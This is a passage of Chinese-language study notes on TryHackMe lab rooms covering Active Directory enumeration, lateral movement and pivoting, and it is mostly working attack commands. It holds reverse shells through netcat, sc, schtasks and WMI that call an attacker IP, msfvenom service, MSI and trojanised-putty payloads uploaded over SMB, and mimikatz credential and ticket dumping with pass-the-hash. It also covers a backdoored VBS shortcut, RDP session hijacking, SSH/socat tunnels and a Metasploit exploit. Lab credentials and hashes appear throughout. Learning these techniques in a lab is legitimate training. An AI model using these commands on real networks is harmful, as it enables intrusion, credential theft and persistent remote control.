信息不完整：net 命令可能无法显示所有信息。例如，如果一个用户是超过十个群组的成员，输出结果中将不会显示所有这些群组。 PowerShellPowerShell 是 cmd 的升级版，最大的区别是提供了 cmdlets（类似方法调用），关于 AD 的 cmdlets 可以参考这个：https://learn.microsoft.com/en-us/powershell/module/activedirectory/?view=windowsserver2022-ps 12345678910111213141516171819202122232425262728# 获取用户的所有属性 # -Properties * 是展示出所有的属性，另外可以手动指定 Get-ADUser -Identity gordon.stevens -Server za.tryhackme.com -Properties * # 可以通过这种方法去过滤出需要的用户和要的信息 Get-ADUser -Filter &#39;Name -like &quot;*stevens&quot;&#39; -Server za.tryhackme.com | Format-Table Name,SamAccountName -A # 查看所有 AD 组 Get-ADGroup -Filter * -Server za.tryhackme.com # 查看 Administrators 组信息 Get-ADGroup -Identity Administrators -Server za.tryhackme.com # 查看 AD 组成员 Get-ADGroupMember -Identity Administrators -Server za.tryhackme.com # 获取 AD 对象 $ChangeDate = New-Object DateTime(2022, 02, 28, 12, 00, 00) Get-ADObject -Filter &#39;whenChanged -gt $ChangeDate&#39; -includeDeletedObjects -Server za.tryhackme.com # 找到错误密码次数大于 0 的用户 Get-ADObject -Filter &#39;badPwdCount -gt 0&#39; -Server za.tryhackme.com # 获取 AD 域的信息 Get-ADDomain -Server za.tryhackme.com # 给域内用户改密码 Set-ADAccountPassword -Identity gordon.stevens -Server za.tryhackme.com -OldPassword (ConvertTo-SecureString -AsPlaintext &quot;old&quot; -force) -NewPassword (ConvertTo-SecureString -AsPlainText &quot;new&quot; -Force) 优点 信息量更大：PowerShell 的 cmdlet（命令行工具）可以比命令提示符中的 net 命令枚举出多得多的信息。 支持远程执行：即使在未加入域的机器上，我们也可以通过 runas 命令来指定服务器和域，从而执行这些命令。 自定义 cmdlet：我们可以创建自己的 cmdlet 来枚举特定的信息。 直接修改对象：我们可以使用 AD-RSAT cmdlet 直接修改 AD 对象，例如重置密码或将用户添加到特定组。 缺点 更容易被监控：与命令提示符相比，PowerShell 通常受到蓝队（安全防御团队）更多的监控。 需要安装工具：我们必须安装 AD-RSAT 工具，或者使用其他可能更容易被检测到的脚本来进行 PowerShell 枚举。 Bloodhound一种图形化分析工具，能图形化的分析域内的信息。然后要用到一个 Sharphound 工具，他是用来收集信息的。 1Sharphound.exe --CollectionMethods All --Domain za.tryhackme.com --ExcludeDCs CollectionMethods：第一次运行之后， 如果只要收集 Session，只运行 Session 即可。也就是提取用户当前登录机器的会话 Domain：指定要收集的域 ExcludeDcs：让工具不要去操作 DC，容易引起警报 Bloodhound 依赖 neo4j 数据库，初次使用要部署一下，然后就是软件的基本使用了。这里用的是 v4 版本，说实话不好用，而且文档也不见了，新版的 Bloodhound 又分为社区版和商业版，之后再去研究，感觉用不上（我错了）。 优点 提供图形化界面：为活动目录（AD）枚举提供了图形用户界面。 展示攻击路径：能够展示已枚举的活动目录信息中的潜在攻击路径。 更深入的洞察：提供了对活动目录对象更深入的洞察，这些信息通常需要通过多次手动查询才能获取。 缺点 需要执行 Sharphound：它的使用需要执行 Sharphound，这个过程会产生较多噪音，并且常常会被防病毒（AV）或端点检测与响应（EDR）解决方案检测到。 总结枚举 AD 是一项庞大的工作。为了更好地理解域的内部结构，并找出可以利用来进行特权提升或横向移动的攻击路径，进行全面的 AD 枚举是必不可少的。 其他的枚举技术 LDAP 枚举 PowerView 缓解措施 监控事件 AD 枚举技术会产生一堆 logon 事件，都是从一个 AD 用户发起的，能编写一个检测规则去识别这种攻击 检测特定软件的签名 监控 CMD 和 PowerShell Lateral Movement and Pivoting房间：https://tryhackme.com/room/lateralmovementandpivoting 时间：20250803 14:00 - 20250804 15:00 这个房间是教横向移动的，也就是从系统里面提取高权限账户，达到拿下高权限机器的作用，主要用的是 Hash 提取，还有 Kerberos。 本地账户只能通过 RDP 去操作有 UAC 的行为，类似 RPC&#x2F;SMB&#x2F;WinRM 之类的操作渠道不行，但是域账户不受限制，还有默认的 Administrator 用户。 远程执行进程下面的技术都有不同的方法去实现相同的目的，有一些可能更加适合某些场景。 Psexec Ports: 445&#x2F;TCP (SMB) Required Group Memberships: Administrators Psexec 是多年来远程执行命令的首选，他允许管理员用户在其可访问的 PC 上远程执行命令，他是许多系统工具之一。 他的工作流如下：连接到 $Admin 共享文件夹上传可执行的服务（PSEXESVC.exe） -&gt; 创建然后执行服务（C:\\Windows\\psexesvc.exe） -&gt; 创建一个管道（\\.\\pipe\\psexesvc\\） 运行 psexec 我们只需要提供管理员的凭据和要运行的命令，如下。 12345psexec64.exe \\\\MACHINE_IP -u Administrator -p Mypass123 -i cmd.exe # 使用 impacket 的 psexec # https://feifei.tw/impacket/ python3 psexec.py ZA.TRYHACKME.COM/t1_leonard.summers:EZpass4ever@THMIIS.za.tryhackme.com 参考链接：https://learn.microsoft.com/en-us/sysinternals/downloads/psexec 使用 WinRM 创建远程进程 Ports: 5985&#x2F;TCP (WinRM HTTP) or 5986&#x2F;TCP (WinRM HTTPS) Required Group Memberships: Remote Management Users 他是一个基于 Web 的协议，可以远程发送 Powershell 命令给 Windows 主机。大多数 Windows Server 会默认开启 WinRM。 123456789101112131415# 通过 CMD 连接到远端 PowerShell 会话 winrs.exe -u:ZA.TRYHACKME.COM\\t1_leonard.summers -p:EZpass4ever -r:THMIIS.za.tryhackme.com cmd # 通过 PowerShell 连接到远端 PowerShell 会话 # 凭证需要处理一下 $username = &#39;ZA.TRYHACKME.COM\\t1_leonard.summers&#39;; $password = &#39;EZpass4ever&#39;; $securePassword = ConvertTo-SecureString $password -AsPlainText -Force; $credential = New-Object System.Management.Automation.PSCredential $username, $securePassword; # 传递凭证连接到远端 Enter-PSSession -Computername THMIIS.za.tryhackme.com -Credential $credential # 直接在远端执行命令并且回显 Invoke-Command -Computername THMIIS.za.tryhackme.com -Credential $credential -ScriptBlock {whoami} 通过 sc 远程创建服务 Ports: 135&#x2F;TCP, 49152-65535&#x2F;TCP (DCE&#x2F;RPC) 445&#x2F;TCP (RPC over SMB Named Pipes) 139&#x2F;TCP (RPC over SMB Named Pipes) Required Group Memberships: Administrators Windows 服务也可以被用来执行任意命令，因为它们在启动时就会运行一个命令。虽然服务的可执行文件在技术上与常规应用程序不同，但如果我们配置一个 Windows 服务去运行任何应用程序，它仍然会执行它，然后在执行结束后失败。并不是没有执行成功，是因为服务没有收到预期的服务控制信号而报错。 sc 的连接过程sc 会尝试通过 RPC 多种方式连接到 Service Control Manager (SVCCTL) DCE&#x2F;RPC 协议连接。客户端会首先连接到 135 端口上的 **Endpoint Mapper (EPM)**。EPM 就像一个可用 RPC 端点的目录，客户端会向它查询 SVCCTL 服务的相关信息。随后，EPM 会回复连接 SVCCTL 服务的 IP 地址和端口号，这个端口号通常是 49152-65535 范围内的动态端口。 如果后续的那个 RPC 连接失败，sc 就会尝试通过 SMB 命名管道去请求 SVCCTL，445 端口或者 139（SMB over NetBIOS）。 123456789101112131415# 通过 sc 创建用户示例 # 注意等号后面带空格是 sc 的特性 sc.exe \\\\TARGET create THMservice binPath= &quot;net user munra Pass123 /add&quot; start= auto sc.exe \\\\TARGET start THMservice # 利用 nc 反弹一个 shell 示例 # 首先凭据注入一下 让注入好凭据的 shell 弹到我们的攻击机上 runas /netonly /user:ZA.TRYHACKME.COM\\t1_leonard.summers &quot;c:\\tools\\nc64.exe -e cmd.exe 10.50.46.241 4443&quot; # 再在 Shell 里面通过 sc 给目标机器创建服务 sc.exe \\\\THMIIS.za.tryhackme.com create THMserviceRe binPath= &quot;c:\\tools\\nc64.exe -e cmd.exe 10.50.46.241 4444&quot; start= auto sc.exe \\\\THMIIS.za.tryhackme.com start THMserviceRe # 停止和删除服务 sc.exe \\\\TARGET stop THMservice sc.exe \\\\TARGET delete THMservice 通过 schtasks 远程创建计划任务12345678910# /sc 是计划的类型 ONCE 是执行一次 # 因为我们是手动执行他，所以时间不重要 schtasks /s THMIIS.za.tryhackme.com /RU &quot;SYSTEM&quot; /create /tn &quot;THMtask1&quot; /tr &quot;c:\\tools\\nc64.exe -e cmd.exe 10.50.46.241 4444&quot; /sc ONCE /sd 01/01/1970 /st 00:00 # 手动运行计划任务 # 因为是计划任务，所以命令的回显不会显示 schtasks /s THMIIS.za.tryhackme.com /run /TN &quot;THMtask1&quot; # 删除计划任务 schtasks /S TARGET /TN &quot;THMtask1&quot; /DELETE /F 实践1234567891011121314151617181920212223# 创建服务小马 msfvenom -p windows/shell/reverse_tcp -f exe-service LHOST=10.50.46.241 LPORT=4444 -o myservice666.exe # 传小马 smbclient -c &#39;put myservice666.exe&#39; -U t1_leonard.summers -W ZA &#39;//thmiis.za.tryhackme.com/admin$/&#39; EZpass4ever # 创建好 handler msfconsole -q -x &quot;use exploit/multi/handler; set payload windows/shell/reverse_tcp; set LHOST lateralmovement; set LPORT 4444;exploit&quot; # 使用指定用户凭据反弹 Shell 回来 runas /netonly /user:ZA.TRYHACKME.COM\\t1_leonard.summers &quot;c:\\tools\\nc64.exe -e cmd.exe 10.50.46.241 4448&quot; # 用 sc 创建服务 sc.exe \\\\thmiis.za.tryhackme.com create THMservice-666 binPath= &quot;%windir%\\myservice666.exe&quot; start= auto sc.exe \\\\thmiis.za.tryhackme.com start THMservice-666 # 注意这个 flag 必须要通过服务生成的 Shell 才能执行 # 刚开始还以为和执行的用户有关 # whoami 是 SYSTEM 执行他也能出 flag # 尝试过 PSEXEC 和 nc 反弹 shell 都不行 # 生成普通马然后创建服务执行也不行 必须要服务马 # 执行 Flag.exe c:\\Users\\t1_leonard.summers\\Desktop\\Flag.exe 通过 WMI 横向移动WMI (Windows Management Instrumentation) 是 Windows 对 WBEM (Web-Based Enterprise Management) 的实现。WBEM 是一项用于跨设备访问管理信息的企业标准。 所有的操作都需要 Administrators 组的权限。 通过 PowerShell 连接 WMI同样要创建 PSCredential 对象。 1234$username = &#39;Administrator&#39;; $password = &#39;Mypass123&#39;; $securePassword = ConvertTo-SecureString $password -AsPlainText -Force; $credential = New-Object System.Management.Automation.PSCredential $username, $securePassword; 可以通过下面的任意一个协议建立 WMI 会话 DCOM: RPC over IP will be used for connecting to WMI. This protocol uses port 135&#x2F;TCP and ports 49152-65535&#x2F;TCP, just as explained when using sc.exe. Wsman: WinRM will be used for connecting to WMI. This protocol uses ports 5985&#x2F;TCP (WinRM HTTP) or 5986&#x2F;TCP (WinRM HTTPS). 12$Opt = New-CimSessionOption -Protocol DCOM $Session = New-Cimsession -ComputerName TARGET -Credential $credential -SessionOption $Opt -ErrorAction Stop New-CimSessionOption 是配置 WMI 会话连接参数，然后将选项和凭证传递给 New-CimSession cmdlet，以建立远程主机会话。 通过 WMI 远程创建进程 Ports: 135&#x2F;TCP, 49152-65535&#x2F;TCP (DCERPC) 5985&#x2F;TCP (WinRM HTTP) or 5986&#x2F;TCP (WinRM HTTPS) Required Group Memberships: Administrators 我们可以利用 Windows 管理工具（WMI）从 Powershell 远程启动进程，向 Win32_Process 类发送 WMI 请求，在我们之前创建的会话下启动进程。WMI 不会回显，不会看到任何输出 123456789101112131415# 创建 text.txt 写入 munrawashere $Command = &quot;powershell.exe -Command Set-Content -Path C:\\text.txt -Value munrawashere&quot;; # 执行小马 必须要完整路径 $Command = &quot;C:\\Windows\\payload.exe&quot;; Invoke-CimMethod -CimSession $Session -ClassName Win32_Process -MethodName Create -Arguments @{ CommandLine = $Command } # 旧环境执行方法 wmic.exe /user:Administrator /password:Mypass123 /node:TARGET process call create &quot;cmd.exe /c calc.exe&quot; # 我跑不起来 提示 Access denied wmic.exe /user:ZA.TRYHACKME.COM\\t1_corine.waters /password:Korine.1994 /node:THMIIS.za.tryhackme.com process call create &quot;C:\\Windows\\payload.exe&quot; 通过 WMI 远程创建服务12345678910111213141516171819202122232425# 创建一个 THMService2 的服务 Invoke-CimMethod -CimSession $Session -ClassName Win32_Service -MethodName Create -Arguments @{ Name = &quot;THMService2&quot;; DisplayName = &quot;THMService2&quot;; PathName = &quot;net user munra2 Pass123 /add&quot;; # Your payload ServiceType = [byte]::Parse(&quot;16&quot;); # Win32OwnProcess : Start service in a new process StartMode = &quot;Manual&quot; } # 创建一个执行小马的服务 Invoke-CimMethod -CimSession $Session -ClassName Win32_Service -MethodName Create -Arguments @{ Name = &quot;THMService2&quot;; DisplayName = &quot;THMService2&quot;; PathName = &quot;%windir%\\payload.exe&quot;; ServiceType = [byte]::Parse(&quot;16&quot;); StartMode = &quot;Manual&quot; } # 启动服务 $Service = Get-CimInstance -CimSession $Session -ClassName Win32_Service -filter &quot;Name LIKE &#39;THMService2&#39;&quot; Invoke-CimMethod -InputObject $Service -MethodName StartService # 停止和删除服务 Invoke-CimMethod -InputObject $Service -MethodName StopService Invoke-CimMethod -InputObject $Service -MethodName Delete ServiceType &#x3D; [byte]::Parse(“16”) 是一个 PowerShell 表达式，用于指定 Windows 服务的类型。这里的 16 是一个代表特定服务类型的数值，它对应于 Windows API 中的 SERVICE_WIN32_OWN_PROCESS 常量。 在 Windows 服务编程中，服务的类型决定了服务如何运行： **ServiceType = 16 (十六进制 0x10)**：代表 SERVICE_WIN32_OWN_PROCESS。这意味着服务将以独立进程的形式运行，拥有自己独立的内存空间。这是最常见的服务类型，也是这里所使用的。 通过 WMI 远程创建计划任务1234567891011121314151617# Payload must be split in Command and Args $Command = &quot;cmd.exe&quot; $Args = &quot;/c net user munra22 aSdf1234 /add&quot; $Action = New-ScheduledTaskAction -CimSession $Session -Execute $Command -Argument $Args Register-ScheduledTask -CimSession $Session -Action $Action -User &quot;NT AUTHORITY\\SYSTEM&quot; -TaskName &quot;THMtask2&quot; # 远程执行小马示例 $Command = &quot;%windir%\\payload.exe&quot; $Action = New-ScheduledTaskAction -CimSession $Session -Execute $Command Register-ScheduledTask -CimSession $Session -Action $Action -User &quot;NT AUTHORITY\\SYSTEM&quot; -TaskName &quot;THMtask2&quot; # 启动计划任务 Start-ScheduledTask -CimSession $Session -TaskName &quot;THMtask2&quot; # 删除计划任务 Unregister-ScheduledTask -CimSession $Session -TaskName &quot;THMtask2&quot; 通过 WMI 安装 MSI 包1234567Invoke-CimMethod -CimSession $Session -ClassName Win32_Product -MethodName Install -Arguments @{PackageLocation = &quot;C:\\Windows\\myinstaller.msi&quot;; Options = &quot;&quot;; AllUsers = $false} # 传统方式实现 wmic /node:TARGET /user:DOMAIN\\USER product call install PackageLocation=c:\\Windows\\myinstaller.msi # 同样跑不起来 Access Denied wmic /node:THMIIS.za.tryhackme.com /user:ZA.TRYHACKME.COM\\t1_corine.waters /password:Korine.1994 product call install PackageLocation=c:\\Windows\\myinstaller88.msi 实践12345678910111213141516171819202122232425# 创建 MSI 马 msfvenom -p windows/shell/reverse_tcp LHOST=10.50.46.241 LPORT=4444 -f msi &gt; myinstaller88.msi # 传 MSI 马 smbclient -c &#39;put myinstaller88.msi&#39; -U t1_corine.waters -W ZA &#39;//thmiis.za.tryhackme.com/admin$/&#39; Korine.1994 # 创建好 handler msfconsole -q -x &quot;use exploit/multi/handler; set payload windows/shell/reverse_tcp; set LHOST lateralmovement; set LPORT 4444;exploit&quot; # 配好 WMI session # 注意我这里用的 Wsman 协议 官方 WP 是 DCOM $username = &#39;t1_corine.waters&#39;; $password = &#39;Korine.1994&#39;; $securePassword = ConvertTo-SecureString $password -AsPlainText -Force; $credential = New-Object System.Management.Automation.PSCredential $username, $securePassword; $Opt = New-CimSessionOption -Protocol Wsman $Session = New-Cimsession -ComputerName thmiis.za.tryhackme.com -Credential $credential -SessionOption $Opt -ErrorAction Stop # 执行 WMI 触发 payload Invoke-CimMethod -CimSession $Session -ClassName Win32_Product -MethodName Install -Arguments @{PackageLocation = &quot;C:\\Windows\\myinstaller88.msi&quot;; Options = &quot;&quot;; AllUsers = $false} # 这关也很奇怪，只能跟着 WP 来 # 自己的解法都拿不到 Flag # 执行 Flag.exe C:\\Users\\t1_corine.waters\\Desktop\\Flag.exe 使用替代身份验证材料标题的这个材料指的是在不知道用户密码的情况下，可以用来访问 Windows 账户的任何数据，这是由于 Windows 认证机制导致的，有以下两种认证机制。 NTLM authentication Kerberos authentication NTLM Authentication整个过程简单说就是服务器发一个 Challenge ，客户端通过自己的 Hash 值和发过来的 Challenge 产生一个 Response 发给服务器。服务器把收到的 Response 和产生的 Challenge 发给 DC，DC 那边存着用户的 NTML Hash，就再走一遍产生 Response 流程，看看产生的 Response 是不是和服务器发过来的一样，如果一样，就通过，不一样拒绝认证。 不过上述过程是域账户的过程，如果用的本地账户，在服务器本地就能验证这个 Response 了（因为存着账户的凭据）。 Pass-the-Hash 传递 Hash通过使用 mimikatz 或类似工具从获得管理权限的主机中提取凭证后，我们可能会得到明文密码或哈希值，这些密码或哈希值很容易被破解。不过，如果我们不够幸运，最终得到的 NTLM 密码哈希值也不会被破解。 虽然看起来我们无法真正使用这些哈希值，但只需知道密码哈希值，就能回应身份验证过程中发送的 NTLM 挑战。这意味着我们无需知道明文密码即可进行身份验证。如果 Windows 域配置为使用 NTLM 身份验证，我们就可以通过哈希值（PtH）成功进行身份验证，而不必破解 NTLM 哈希值。 要提取 NTLM 哈希值，我们可以使用 mimikatz 读取本地 SAM，或者直接从 LSASS 内存中提取哈希值。 以下命令都是在 mimikatz 工具里面执行的，记得提前传到机器里面。 123456789101112131415# 从本地 SAM 文件中提取 NTLM hash # 只能提取本地用户的 NTLM Hash privilege::debug token::elevate lsadump::sam # 从 LSASS 内存中提取 NTLM hash privilege::debug token::elevate sekurlsa::msv # 通过 hash 去注入反向 shell # PTH 需要在非管理员令牌的上下文中才能成功注入哈希并执行命令 token::revert sekurlsa::pth /user:bob.jenkins /domain:za.tryhackme.com /ntlm:6b4a57f67805a663c818106dc0648484 /run:&quot;c:\\tools\\nc64.exe -e cmd.exe ATTACKER_IP 5555&quot; Passing the Hash Using Linux12345# Connect to RDP using PtH xfreerdp3 /v:10.200.48.201 /u:za.tryhackme.com\\\\t1_toby.beck /pth:533f1bd576caa912bdb9da284bbc60fe # Connect via psexec using PtH # Note: Only the linux version of psexec support PtH. psexec.py -hashes NTLM_HASH DOMAIN/MyUser@VICTIM_IP Connect to WinRM using PtH: 1evil-winrm -i VICTIM_IP -u MyUser -H NTLM_HASH Kerberos 认证认证过程 用户明文发送他的用户名和用它密码的 Hash 加密过的 timestamp 发送到 **Key Distribution Center (KDC)**。 KDC 会创建一个 Ticket Granting Ticket (TGT) 发送回来，他允许用户使用这个 ticket 去向 KDC 请求访问其他服务的 ticket，而不用传递他们的用户凭证。随着 TGT 发送的还有一个 Session Key，用户需要用它去生成后续的请求。 注意这个 TGT 是用 krbtgt 账户的密码 Hash 加密的，所以用户不能访问里面的内容。但加密的 TGT 里面带一份 Session Key，所以 KDC 不需要存储 Session Key ，因为他可以从 TGT 里面恢复出来。 当用户想要访问网络上的服务时，例如共享文件夹、网站或数据库，他们会使用TGT 向 KDC 请求 **TGS (Ticket Granting Service)**。TGS 是一种仅允许连接到为其创建的特定服务的 ticket。为了请求 TGS，用户会发送他们的 Session Key 加密的 用户名和 timestamp，作为 Authenticator。还有 TGT 和 **Service Principal Name (SPN)**。这个 SPN 标识了我们打算访问的服务和服务器名称。 KDC 会向我们发送一个 TGS 和一个用 Session Key 加密的 Service Session Key，我们需要用这两个密钥来验证我们要访问的服务。TGS 会用服务所有者的 Hash 进行加密，然后这个 TGS 也跟 TGT 类似，会带一份 Service Session Key，服务所有者可以用他自己的 Hash 来解密。 然后可以将TGS发送到所需的服务以进行身份验证和建立连接。该服务将使用其配置的帐户的密码哈希解密TGS并验证服务会话密钥。 解释一下：发送的 Username 和 Timestamp 构成的 Authenticator 是用 Service Session Key 加密的，服务可以用它自己的 Hash 从 TGS 解密出 Service Session Key，然后就可以来解密客户端发来的 Authenticator。 整个过程中，只有在请求 TGT 的时候，用户名没有加密，只加密 timestamp，其他的过程中都是把用户名和 timestamp 一起构成 Authenticator 。 认证过程简述1. AS (Authentication Service) 认证阶段 用户向 KDC 发送一个明文请求，其中包含他们的用户名和想要访问的**服务主体名称 (SPN)**，这个 SPN 在第一步是固定的，就是 krbtgt。 KDC 收到请求后，会查找该用户账户的密码哈希。它使用这个哈希来解密请求中的时间戳，如果解密成功，就验证了用户的身份。 KDC 随后会生成一个**客户端会话密钥 (Client Session Key)**，并用这个密钥来加密时间戳。 KDC 最后会用 krbtgt 账户的密码哈希加密一个 TGT (Ticket Granting Ticket)。这个 TGT 包含了客户端会话密钥、用户信息、有效时间等内容。 KDC 将加密的 TGT 和用用户密码哈希加密过的客户端会话密钥发送给用户。 用户收到后，用自己的密码哈希解密出客户端会话密钥，并保存它，但无法解密 TGT。 2. TGS (Ticket Granting Service) 认证阶段 用户现在想要访问其他服务。他们使用自己保存的客户端会话密钥来生成一个 Authenticator，这是一个动态生成的结构，包含用户名和时间戳等信息。 用户将这个加密的 Authenticator 和之前收到的 TGT (未解密) 以及想要访问服务的 SPN 一起发送给 KDC。 KDC 收到后，用 krbtgt 账户的密码哈希解密 TGT，从而提取出客户端会话密钥。 KDC 再用这个客户端会话密钥去解密 Authenticator。如果成功，就验证了用户是 TGT 的合法持有者。 KDC 随后会生成一个**服务会话密钥 (Service Session Key)**。 KDC 创建一个 TGS (Ticket Granting Service)，其中包含了服务会话密钥、用户信息和时间戳。这个 TGS 会用服务账户的密码哈希进行加密。 KDC 将加密的 TGS 和用客户端会话密钥加密过的服务会话密钥发送给用户。 用户收到后，用自己的客户端会话密钥解密出服务会话密钥，并保存它。 3. 服务验证阶段 用户现在拥有了 TGS 和服务会话密钥。 用户会生成另一个用服务会话密钥加密的 Authenticator，并与 TGS 一起发送给目标服务。 服务收到后，使用自己账户的密码哈希解密 TGS，成功后就拿到了服务会话密钥。 服务再用这个服务会话密钥去解密用户发送的 Authenticator。 如果所有验证都通过，服务就会确认用户身份合法，并允许访问。 Pass-the-Ticket 传递票据有些时候我们可以用 mimikatz 从 LSASS 内存中提取 Kerberos ticket 和 session keys，这个过程需要我们拥有 SYSTEM 权限，命令如下 123456# 下载 mimikatz curl -o mimikatz.exe http://10.50.46.241/mimikatz.exe # 提取 Ticket privilege::debug sekurlsa::tickets /export 如果我们只能访问 ticket，而不能访问 session key，那么这个 ticket 就没用。参考前面的认证过程，发送的 username 和 timestamp 要用 session key 进行加密构成 Authenticator。 虽然 mimikatz 可以从 LSASS 进程的内存中提取任何可用的 TGT 或 TGS，但大多数时候，我们会对 TGT 感兴趣，因为它们可以用来请求访问允许用户访问的任何服务。同时，TGS 只适用于特定服务。提取 TGT 需要管理员凭证，而提取 TGS 则可以使用低权限账户（仅分配给该账户的权限）。 提取出所需的 ticket 后，我们就可以使用以下命令将 ticket 注入当前会话： 1kerberos::ptt [0;427fcd5]-2-0-40e10000-Administrator@krbtgt-ZA.TRYHACKME.COM.kirbi 在我们自己的会话中注入票据不需要管理员权限。之后，我们使用的任何横向移动工具都可以使用这些票据。要检查是否正确注入了票据，可以使用 klist 命令。 12345678910111213141516za\\bob.jenkins@THMJMP2 C:\\&gt; klist Current LogonId is 0:0x1e43562 Cached Tickets: (1) #0&gt; Client: Administrator @ ZA.TRYHACKME.COM Server: krbtgt/ZA.TRYHACKME.COM @ ZA.TRYHACKME.COM KerbTicket Encryption Type: AES-256-CTS-HMAC-SHA1-96 Ticket Flags 0x40e10000 -&gt; forwardable renewable initial pre_authent name_canonicalize Start Time: 4/12/2022 0:28:35 (local) End Time: 4/12/2022 10:28:35 (local) Renew Time: 4/23/2022 0:28:35 (local) Session Key Type: AES-256-CTS-HMAC-SHA1-96 Cache Flags: 0x1 -&gt; PRIMARY Kdc Called: THMDC.za.tryhackme.com Overpass-the-hash &#x2F; Pass-the-Key这种攻击类型类似于 PtH，但他是作用在 Kerberos 上的。 当用户请求 TGT 时，他们会发送一个时间戳，该时间戳使用从密码中提取的加密密钥加密。根据安装的 Windows 版本和 Kerberos 配置，用于生成该密钥的算法可以是 DES（当前 Windows 版本默认禁用）、RC4、AES128 或 AES256。如果我们拥有这些密钥中的任何一个，就可以向 KDC 申请 TGT，而不需要实际密码，因此被称为 **Pass-the-key (PtK)**。 123456# 提取 Hash privilege::debug sekurlsa::ekeys # 弹一个目标用户权限的 Shell sekurlsa::pth /user:t1_toby.beck /domain:za.tryhackme.com /rc4:533f1bd576caa912bdb9da284bbc60fe /run:&quot;c:\\tools\\nc64.exe -e cmd.exe 10.50.46.241 5556&quot; 请注意，使用 RC4 时，密钥等于用户的 NTLM 哈希值。这意味着，如果我们能提取 NTLM 哈希值，只要 RC4 是启用的协议之一，我们就能用它来请求 TGT。这种特殊的变种通常被称为 **Overpass-the-Hash (OPtH)**。 实践房间的意思应该是我们看能不能提取 t1_toby.beck 的 Hash，然后用这个 Hash 去生成 TGT。 123456789101112131415# 提取 Hash privilege::debug sekurlsa::ekeys # 用 Hash 生成一个有目标用户权限的 Shell sekurlsa::pth /user:t1_toby.beck /domain:za.tryhackme.com /rc4:533f1bd576caa912bdb9da284bbc60fe /run:&quot;c:\\tools\\nc64.exe -e cmd.exe 10.50.46.241 5001&quot; # 拿到目标机器上的 Shell winrs.exe -r:THMIIS.za.tryhackme.com cmd # 直接执行 Flag.exe # 这里用 -i 能连上，但是可能是两层 Shell 的原因，命令不回显 psexec64.exe \\\\THMIIS.za.tryhackme.com C:\\Users\\t1_toby.beck\\Desktop\\Flag.exe # 这种方式不知道为什么执行 Flag 拿不到 python3 psexec.py t1_toby.beck@THMIIS.za.tryhackme.com -hashes :533f1bd576caa912bdb9da284bbc60fe 滥用用户行为在某些情况下，攻击者可以利用用户执行的操作进一步访问网络中的机器。 滥用可写共享托管在网络共享上的脚本或可执行文件的快捷方式，当用户执行这个快捷方式，可执行文件将从服务器复制到 %temp% 文件夹，并在工作站上执行。 后门 VBS 脚本1CreateObject(\"WScript.Shell\").Run \"cmd.exe /c copy /Y \\\\10.10.28.6\\myshare\\nc64.exe %tmp% & %tmp%\\nc64.exe -e cmd.exe 1234\", 0, True 后门 EXE 程序1msfvenom -a x64 --platform windows -x putty.exe -k -p windows/meterpreter/reverse_tcp lhost=&lt;attacker_ip&gt; lport=4444 -b &quot;\\x00&quot; -f exe -o puttyX.exe RDP 劫持当管理员使用远程桌面连接到计算机并关闭 RDP 客户端而不是注销时，他的会话将在服务器上无限期地保持打开状态。如果您在 Windows Server 2016 及更早版本上拥有 SYSTEM 权限，就可以接管任何现有的 RDP 会话，而无需密码。 12345678# 用 SYSTEM 账户的权限来启动一个 cmd.exe c:/tools/PsExec64.exe -s cmd.exe # 查询活动会话 query user # 连接会话 /dest: 是我们目前的会话 前面的数字 3 是我们要连接的会话 tscon 3 /dest:rdp-tcp#6 Windows Server 2019 及以上的系统就不允许连接到其他的用户会话了 端口转发我们介绍的大多数横向移动技术都需要特定端口供攻击者使用。在现实世界的网络中，管理员可能出于安全原因屏蔽了其中一些端口，或者在网络周围实施了隔离，从而阻止你访问 SMB、RDP、WinRM 或 RPC 端口。 要绕过这些限制，我们可以使用端口转发技术，即把任何被入侵的主机作为跳转箱，转到其他主机。由于企业中的每个角色对日常工作所需的网络服务都有不同的需求，因此预计某些机器会比其他机器拥有更多的网络权限。 SSH 隧道在被攻击机上往往没有 SSH 服务端，我们需要反向连回来打通隧道 123# 创建一个专门给隧道用的用户 useradd tunneluser -m -d /home/tunneluser -s /bin/true passwd tunneluser SSH 远程端口转发即把远程端口转移到本地，本地主动发起连接。 1234# 1.1.1.1 是攻击机的 IP # 3389:3.3.3.3:3389 攻击机端口:目的机器IP:目的端口 # -N 是不请求 shell ssh tunneluser@1.1.1.1 -R 3389:3.3.3.3:3389 -N SSH 本地端口转发把本地端口转移到对面，对面主动发起连接。 1234567# *:80 监听所有网络接口的 80 端口 # 127.0.0.1:80 是攻击机的的本地回环地址和端口 # 也可以这样 192.168.244.1:8080 这样就转发到了攻击机的内网的机器上了 ssh tunneluser@1.1.1.1 -L *:80:127.0.0.1:80 -N # 因为开了一个 80 的监听端口，防火墙策略也要放开 netsh advfirewall firewall add rule name=&quot;Open Port 80&quot; dir=in action=allow protocol=TCP localport=80 socat 端口转发12345678910# 监听本地 1234 端口 把流量都转发到 1.1.1.1:4321 去 # fork 选项允许为每个收到的连接分叉一个新进程 # 如果不带这个参数一次连接就会断开了 socat TCP4-LISTEN:1234,fork TCP4:1.1.1.1:4321 # 转发内网机器3.3.3.3的 3389 端口暴露到本地 3389 端口 socat TCP4-LISTEN:3389,fork TCP4:3.3.3.3:3389 # 添加防火墙规则 netsh advfirewall firewall add rule name=&quot;Open Port 3389&quot; dir=in action=allow protocol=TCP localport=3389 动态端口转发和 SOCKS其实这个有点误解人，我不太理解他的意思，看起来好像 SSH 自动开了一个 SOCKS 服务端一样，我也没有去尝试他。 1ssh tunneluser@1.1.1.1 -R 9050 -N RDP 转发实践123ssh za\\\\terence.lloyd@thmjmp2.za.tryhackme.com C:\\tools\\socat\\socat TCP4-LISTEN:13389,fork TCP4:THMIIS.za.tryhackme.com:3389 隧道复杂利用1234# SSH 端口转发 ssh tunneluser@10.50.46.241 -R 8888:thmdc.za.tryhackme.com:80 -L *:6666:127.0.0.1:6666 -L *:7878:127.0.0.1:7878 -N # 开启 SSH 服务 sudo systemctl start ssh 执行 RCE 123456789101112131415161718msfconsole use rejetto_hfs_exec set payload windows/shell_reverse_tcp # 小马要在远端机器上访问的地址 set lhost thmjmp2.za.tryhackme.com # 强制监听地址是 127.0.0.1 如果不填的话，就是 LHOST 的值 set ReverseListenerBindAddress 127.0.0.1 # 跳板机 7878 端口转发到我们本地 7878 端口 set lport 7878 # Payload 监听地址 set srvhost 127.0.0.1 # Payload 监听端口 http://thmjmp2.za.tryhackme.com:6666/4pdqhjQTjbrGJW set srvport 6666 set rhosts 127.0.0.1 set rport 8888 exploit 拓展 Sshuttle Rpivot Chisel Hijacking Sockets with Shadowmove 